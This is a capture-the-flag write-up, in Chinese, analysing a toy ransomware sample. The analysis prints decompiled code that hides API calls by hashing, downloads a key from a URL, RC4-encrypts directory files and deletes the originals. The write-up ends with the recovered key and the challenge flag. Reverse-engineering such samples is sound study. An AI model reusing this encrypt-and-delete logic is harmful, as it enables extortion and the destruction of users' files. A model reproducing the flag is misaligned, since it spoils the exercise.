# Simple Reverse 0x31(2023 HW - Baby Ransom 2)
## Background
* [SystemFunction033](https://forum.butian.net/share/2204)
## Source code
:::spoiler IDA WinMain
```cpp=
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
  HWND hWnd; // [rsp+60h] [rbp-A8h]
  WNDCLASSW WndClass; // [rsp+70h] [rbp-98h] BYREF
  struct tagMSG Msg; // [rsp+C0h] [rbp-48h] BYREF

  memset(&WndClass, 0, sizeof(WndClass));
  WndClass.lpfnWndProc = (WNDPROC)store_winword;
  WndClass.hInstance = hInstance;
  WndClass.lpszClassName = Caption;
  WndClass.hbrBackground = CreateSolidBrush(0);
  if ( !RegisterClassW(&WndClass) )
    return 1;
  hWnd = CreateWindowExW(0, Caption, Caption, 0xCF0000u, 100, 100, 800, 600, 0i64, 0i64, hInstance, 0i64);
  if ( !hWnd )
    return 2;
  MainPayload();
  ShowWindow(hWnd, nShowCmd);
  memset(&Msg, 0, sizeof(Msg));
  while ( GetMessageW(&Msg, 0i64, 0, 0) )
  {
    TranslateMessage(&Msg);
    DispatchMessageW(&Msg);
  }
  return 0;
}
```
:::
:::spoiler IDA MainPayload
```cpp=
void __stdcall MainPayload()
{
  LoadLibraryA(LibFileName);
  LoadLibraryA(aWininetDll);
  if ( !(unsigned int)DynamicAPIResolution() )
    DoSomethingBad();
}
```
:::
:::spoiler IDA DynamicAPIResolution
```cpp=
__int64 DynamicAPIResolution()
{
  // [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-"+" TO EXPAND]

  p_InLoadOrderModuleList = &NtCurrentPeb()->Ldr->InLoadOrderModuleList;
  for ( module = p_InLoadOrderModuleList;
        module->InLoadOrderLinks.Flink != p_InLoadOrderModuleList;
        module = module->InLoadOrderLinks.Flink )
  {
    dll_name = module->BaseDllName.Buffer;
    dll_base = module->DllBase;
    if ( dll_name )
    {
      if ( (*dll_name == 'k' || *dll_name == 'K')
        && (dll_name[1] == 'e' || dll_name[1] == 'E')
        && (dll_name[2] == 'r' || dll_name[2] == 'R')
        && (dll_name[3] == 'n' || dll_name[3] == 'N')
        && (dll_name[4] == 'e' || dll_name[4] == 'E')
        && (dll_name[5] == 'l' || dll_name[5] == 'L')
        && dll_name[6] == '3'
        && dll_name[7] == '2' )                 // import kernel32 library
      {
        exportTable = (dll_base + getNtHdrs(dll_base)->OptionalHeader.DataDirectory[0].VirtualAddress);
        num_of_names = exportTable->NumberOfNames;
        name_array = dll_base + exportTable->AddressOfNames;
        name_ordinal = dll_base + exportTable->AddressOfNameOrdinals;
        func_array = dll_base + exportTable->AddressOfFunctions;
        for ( i = 0i64; i < num_of_names; ++i )
        {
          api_name = (dll_base + *&func_array[4 * *&name_ordinal[2 * i]]);
          case_0 = search_case(dll_base + *&name_array[4 * i]);
          switch ( case_0 )
          {
            case 0x69D265FE6B1C110Fi64:
              LoadLibraryA_0 = api_name;
              break;
            case 0x578960F1FC7FFF25i64:
              GetProcAddress = api_name;
              break;
            case 0xFA55E32C9D72A921i64:
              qword_140007A98 = api_name;
              break;
            case 0xE0746E00B47C0477i64:
              GetLastError = api_name;
              break;
            case 0xE7BDCAD1F3AE0E13i64:
              CreateDirectoryA = api_name;
              break;
            case 0x1C71D0537E2246F5i64:
              FindFirstFileA = api_name;
              break;
            case 0x121E523CBB49F938i64:
              FindNextFileA = api_name;
              break;
            case 0x1C8EF920B632E586i64:
              FindClose = api_name;
              break;
            case 0x28D0403A889E4F69i64:
              copyFileA = api_name;
              break;
            case 0x556A045B10DE85i64:
              CloseHandle = api_name;
              break;
            case 0x2E97865AB85128C3i64:
              ReadFile = api_name;
              break;
            case 0x2FA16C1D95E4306Ai64:
              WriteFile = api_name;
              break;
            case 0x5D35AEBEDFD88117i64:
              DeleteFileA = api_name;
              break;
            case 0xFC59546FD0D3D778i64:
              GetFileSize = api_name;
              break;
            case 0xEBC4E8E9B1542DEEi64:
              CreateFileA = api_name;
              break;
          }
        }
      }
      else if ( (*dll_name == 'm' || *dll_name == 'M')
             && (dll_name[1] == 's' || dll_name[1] == 'S')
             && (dll_name[2] == 'v' || dll_name[2] == 'V')
             && (dll_name[3] == 'c' || dll_name[3] == 'C')
             && (dll_name[4] == 'r' || dll_name[4] == 'R')
             && (dll_name[5] == 't' || dll_name[5] == 'T') )// import msvcrt library
      {
        exportTable_1 = (dll_base + getNtHdrs(dll_base)->OptionalHeader.DataDirectory[0].VirtualAddress);
        num_of_names_1 = exportTable_1->NumberOfNames;
        name_array_1 = dll_base + exportTable_1->AddressOfNames;
        name_ordinal_1 = dll_base + exportTable_1->AddressOfNameOrdinals;
        func_array_1 = dll_base + exportTable_1->AddressOfFunctions;
        for ( j = 0i64; j < num_of_names_1; ++j )
        {
          api_name_1 = (dll_base + *&func_array_1[4 * *&name_ordinal_1[2 * j]]);
          case_1 = search_case(dll_base + *&name_array_1[4 * j]);
          switch ( case_1 )
          {
            case 0x974ADB99DCFF7A24i64:
              qword_140007B08 = api_name_1;
              break;
            case 0xD9C0619DA0F59BADi64:
              malloc = api_name_1;
              break;
            case 0x2AB2847890E35C03i64:
              sprintf_s = api_name_1;
              break;
          }
        }
      }
      else if ( (*dll_name == 'u' || *dll_name == 'U')
             && (dll_name[1] == 's' || dll_name[1] == 'S')
             && (dll_name[2] == 'e' || dll_name[2] == 'E')
             && (dll_name[3] == 'r' || dll_name[3] == 'R')
             && dll_name[4] == '3'
             && dll_name[5] == '2' )            // import user32 library
      {
        exportTable_2 = (dll_base + getNtHdrs(dll_base)->OptionalHeader.DataDirectory[0].VirtualAddress);
        num_of_names_2 = exportTable_2->NumberOfNames;
        name_array_2 = dll_base + exportTable_2->AddressOfNames;
        name_ordinal_2 = dll_base + exportTable_2->AddressOfNameOrdinals;
        func_array_2 = dll_base + exportTable_2->AddressOfFunctions;
        for ( k = 0i64; k < num_of_names_2; ++k )
        {
          api_name_2 = dll_base + *&func_array_2[4 * *&name_ordinal_2[2 * k]];
          if ( search_case(dll_base + *&name_array_2[4 * k]) == 0x1E307D27BA21DDA4i64 )
            qword_140007A80 = api_name_2;
        }
      }
      else if ( (*dll_name == 'w' || *dll_name == 'W')
             && (dll_name[1] == 'i' || dll_name[1] == 'I')
             && (dll_name[2] == 'n' || dll_name[2] == 'N')
             && (dll_name[3] == 'i' || dll_name[3] == 'I')
             && (dll_name[4] == 'n' || dll_name[4] == 'N')
             && (dll_name[5] == 'e' || dll_name[5] == 'E')
             && (dll_name[6] == 't' || dll_name[6] == 'T') )// import wineinet library
      {
        exportTable_3 = (dll_base + getNtHdrs(dll_base)->OptionalHeader.DataDirectory[0].VirtualAddress);
        num_of_names_3 = exportTable_3->NumberOfNames;
        name_array_3 = dll_base + exportTable_3->AddressOfNames;
        name_ordinal_3 = dll_base + exportTable_3->AddressOfNameOrdinals;
        func_array_3 = dll_base + exportTable_3->AddressOfFunctions;
        for ( m = 0i64; m < num_of_names_3; ++m )
        {
          api_name_3 = (dll_base + *&func_array_3[4 * *&name_ordinal_3[2 * m]]);
          case_3 = search_case(dll_base + *&name_array_3[4 * m]);
          switch ( case_3 )
          {
            case 0x8261F0DF5FDC0887i64:
              InternetOpenA = api_name_3;
              break;
            case 0xE726A35A86C7641Ci64:
              InternetOpenUrlA = api_name_3;
              break;
            case 0x6F4E79C87F04F3E6i64:
              InternetReadFile = api_name_3;
              break;
            case 0x2DF8494D5C13046i64:
              InternetCloseHandle = api_name_3;
              break;
          }
        }
      }
    }
  }
  return 0i64;
}
```
:::
:::spoiler IDA DoSomethingBad
```cpp=
void __stdcall DoSomethingBad()
{
  HMODULE LibraryA_0; // rax
  HANDLE FirstFileA; // [rsp+20h] [rbp-188h]
  const void *space; // [rsp+30h] [rbp-178h] BYREF
  DWORD fileSize; // [rsp+38h] [rbp-170h] BYREF
  struct _WIN32_FIND_DATAA lpFindFileData; // [rsp+40h] [rbp-168h] BYREF
  char folderName[24]; // [rsp+180h] [rbp-28h] BYREF

  strcpy(folderName, "Microsoft Update Backup");
  if ( (CreateDirectoryA(folderName, 0i64) || GetLastError() == ERROR_ALREADY_EXISTS) && !(unsigned int)InternetConnect() )
  {
    LibraryA_0 = LoadLibraryA_0(aAdvapi32);
    SystemFunction032 = (__int64 (__fastcall *)(_QWORD, _QWORD))GetProcAddress(LibraryA_0, ProcName);
    FirstFileA = FindFirstFileA(FileName, &lpFindFileData);
    if ( FirstFileA != (HANDLE)-1i64 )
    {
      do
      {
        space = 0i64;
        if ( (lpFindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == 0
          && !(unsigned int)Create_Read_File(lpFindFileData.cFileName, (LPVOID *)&space, &fileSize) )
        {
          if ( (unsigned int)sprintf_copyFile(lpFindFileData.cFileName, folderName) )
            Create_Write_Delete_File(lpFindFileData.cFileName, space, fileSize);
        }
      }
      while ( FindNextFileA(FirstFileA, &lpFindFileData) );
      FindClose(FirstFileA);
    }
  }
}
```
:::
:::spoiler IDA InternetConnect
```cpp=
__int64 InternetConnect()
{
  unsigned int v1; // [rsp+30h] [rbp-38h]
  BOOL i; // [rsp+34h] [rbp-34h]
  _BYTE *lpBuffer; // [rsp+38h] [rbp-30h]
  HINTERNET hFile; // [rsp+40h] [rbp-28h]
  HINTERNET hInternet; // [rsp+48h] [rbp-20h]
  LPDWORD *lpdwNumberOfBytesRead; // [rsp+50h] [rbp-18h] BYREF

  lpBuffer = malloc(0x1000ui64);
  hInternet = InternetOpenA(szAgent, 1u, 0i64, 0i64, 0);
  if ( !hInternet )
    return 1i64;
  hFile = InternetOpenUrlA(hInternet, szUrl, 0i64, 0, INTERNET_FLAG_RELOAD, 0i64);
  if ( hFile )
  {
    v1 = 0;
    for ( i = InternetReadFile(hFile, lpBuffer, 0x1000u, &lpdwNumberOfBytesRead);
          i && lpdwNumberOfBytesRead && v1 < 0x1000;
          i = InternetReadFile(hFile, &lpBuffer[v1], 4096 - v1, &lpdwNumberOfBytesRead) )
    {
      v1 += lpdwNumberOfBytesRead;
    }
    qword_140007460 = (lpBuffer + 2687);
    lpBuffer[2706] = 0;
    InternetCloseHandle(hFile);
    InternetCloseHandle(hInternet);
    return 0i64;
  }
  else
  {
    InternetCloseHandle(hInternet);
    return 2i64;
  }
}
```
:::
:::spoiler IDA Create_Read_File
```cpp=
__int64 __fastcall Create_Read_File(LPCSTR lpFileName, LPVOID *space, DWORD *fileSize)
{
  HANDLE hFile; // [rsp+40h] [rbp-128h]
  LPDWORD NumberOfBytesRead; // [rsp+48h] [rbp-120h] BYREF
  char v6; // [rsp+50h] [rbp-118h] BYREF

  hFile = CreateFileA(lpFileName, GENERIC_READ, 0, 0i64, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0i64);
  if ( hFile == (HANDLE)-1i64 )
    return 1i64;
  *fileSize = GetFileSize(hFile, 0i64);
  sub_140002A40((int)&v6, 256, (int)aD, *fileSize);
  *space = malloc(*fileSize + 1i64);
  if ( *space )
  {
    if ( ReadFile(hFile, *space, *fileSize, (LPDWORD)&NumberOfBytesRead, 0i64) )
    {
      *((_BYTE *)*space + *fileSize) = 0;
      CloseHandle(hFile);
    }
    return 0i64;
  }
  else
  {
    CloseHandle(hFile);
    return 1i64;
  }
}
```
:::
:::spoiler IDA sprintf_copyFile
```cpp=
__int64 __fastcall sprintf_copyFile(const char *FileName, const char *folderName)
{
  char buffer[272]; // [rsp+30h] [rbp-128h] BYREF

  sprintf_s(buffer, 0x104ui64, "%s\\%s", folderName, FileName);// FolderName => Microsoft Update Backup
                                                // FileName => baby-ransom.exe
  return copyFileA(FileName, buffer, 0i64);
}
```
:::
:::spoiler IDA Create_Write_Delete_File
```cpp=
void __fastcall Create_Write_Delete_File(const char *fileName, const void *space, DWORD fileSize)
{
  unsigned __int64 v3; // [rsp+40h] [rbp-178h]
  __int64 v4; // [rsp+48h] [rbp-170h]
  HANDLE hFile; // [rsp+50h] [rbp-168h]
  DWORD nNumberOfBytesToWrite; // [rsp+68h] [rbp-150h] BYREF
  LPCVOID lpBuffer; // [rsp+70h] [rbp-148h]
  const struct ustring *key; // [rsp+78h] [rbp-140h] BYREF
  __int64 v9; // [rsp+80h] [rbp-138h]
  DWORD NumberOfBytesWritten[2]; // [rsp+88h] [rbp-130h] BYREF
  char Buffer[272]; // [rsp+90h] [rbp-128h] BYREF

  v9 = qword_140007460;
  LODWORD(key) = 19;
  v3 = -1i64;
  do
    ++v3;
  while ( fileName[v3] );                       // 這個do_while loop的結果是0xf，因為"baby-ransom.exe"總共15個字
  if ( v3 <= 0x13 )
  {
    v4 = -1i64;
    do
      ++v4;
    while ( fileName[v4] );
    LODWORD(key) = v4;
  }
  lpBuffer = space;
  nNumberOfBytesToWrite = fileSize;
  SystemFunction032(&nNumberOfBytesToWrite, &key);
  sprintf_s(Buffer, 0x104ui64, "enc_%s", fileName);
  hFile = CreateFileA(Buffer, 0x40000000u, 0, 0i64, 2u, 0x80u, 0i64);
  if ( hFile != (HANDLE)-1i64 )
  {
    if ( WriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, NumberOfBytesWritten, 0i64) )
      DeleteFileA(fileName);
    CloseHandle(hFile);
  }
}
```
:::
## Recon
這一題只要慢慢分析其實很簡單，也有很多是上課就有教到的地方，一樣從上到下(source code)
1. 首先，如果直接執行這個程式的話，過沒多久會跳出一個視窗，其他部分"好像"沒有甚麼特別攻擊的行為，從`WinMain`中可以大略知曉這些事情，也就是攻擊者事先決定好一個通知的視窗(就是要叫你付錢的視窗)的一些設定(包含顏色、字形、字體等等)，接著就進到`MainPayload`搞事
2. 首先他先load `msvcrt.dll`和`wininet.dll`這兩個library，再用上課教的==Dynamic API Resolution==，把原本process上的`kernel32.dll`, `msvcrt.dll`和`user32.dll`也一併load到該thread，接著就進到==DoSomethingBad==這邊
3. 從上到下就做幾件事情
    1. 創一個名叫`Microsoft Update Backup`的folder
    2. 進行網路連線
        1. 試圖連線`https://shouldhavecat.com/robots.txt`這個網站
        2. 如果連線成功就讀取該網站的內容
    3. Load進`SystemFunction032`這個library$\to$非常重要
    4. 找目前目錄的第一個檔案(不限檔案類型)
    5. 進到`Create_Read_File`
        1. 創一個file，名字和之前取得的檔案名稱一樣(假設爬到的file名稱是`flag.txt`，那新的file也是一樣的名字)
        2. malloc一個大小為該檔案大小的空間(假設`flag.txt`的大小是0x11，malloc的空間就是0x11)
        3. 讀flag.txt到這個malloc空間
    6. 進到`sprintf_copyFile`，就是把`./flag.txt`複製到`./Microsoft Update Backup/flag.txt`中
    7. 進到`Create_Write_Delete_File`，這是最重要的部分
        1. 計算RC4加密需要的key，這個就是從一開始從`https://shouldhavecat.com/robots.txt`讀取下來的內容中擷取一段8個bytes當作key
        2. 利用`SystemFunction032`把我們的檔案加密
        3. 創一個`enc_flag.txt`這個檔案然後把加密的cipher寫進去
4. 加密的部分
    從[SystemFunction033](https://forum.butian.net/share/2204)這個網站可以知道`SystemFunction033`一開始的結構，我們可以順著這個結構去推敲解密需要的key
    ```cpp
    struct ustring {
        DWORD Length;
        DWORD MaximumLength;
        PUCHAR Buffer;
    } _data, key;

    typedef NTSTATUS(WINAPI* _SystemFunction033)(
        struct ustring* memoryRegion,
        struct ustring* keyPointer
    );
    ```
    ![圖片.png](https://hackmd.io/_uploads/SktO1q9X6.png)
    1. 執行這行之前，跟一下他的資料結構，首先前4 bytes是代表大小，後4 bytes代表maximum length，後8 bytes代表該資料的pointer
    2. 第一個parameter就是要加密的檔案，大小就是0x11，儲存在`0x214E5567710`，所以要加密的明文是`FLAG{test_134567}`
        ![圖片.png](https://hackmd.io/_uploads/HJMYeqcXp.png)
    3. 第二個parameter就是加密所需要的key，大小是0x8，位置是`0x324E556613F`，所以加密所需的key是==2F 37 32 38 33 33 31 33==
        ![圖片.png](https://hackmd.io/_uploads/S1Oagqc76.png)
5. 既然已經知道所有的流程就直接使用線上工具解密即可

## Exploit
直接用[online tool](https://cryptii.com/pipes/rc4-encryption) decrypt cipher
* Ciphertext: `71 04 1F C7 93 1A 7C A0 E1 F5 08 44 D0 08 18 D7 1D E0 22 B5 A3 AD 3A C9 B2 D5 E7 40 41 4B 86 97 E8 2E 6B`
* Key: `2F 37 32 38 33 33 31 33`
![圖片.png](https://hackmd.io/_uploads/HJBADQq76.png)

Flag: `FLAG{50_y0u_p4y_7h3_r4n50m?!hmmmmm}`
## Reference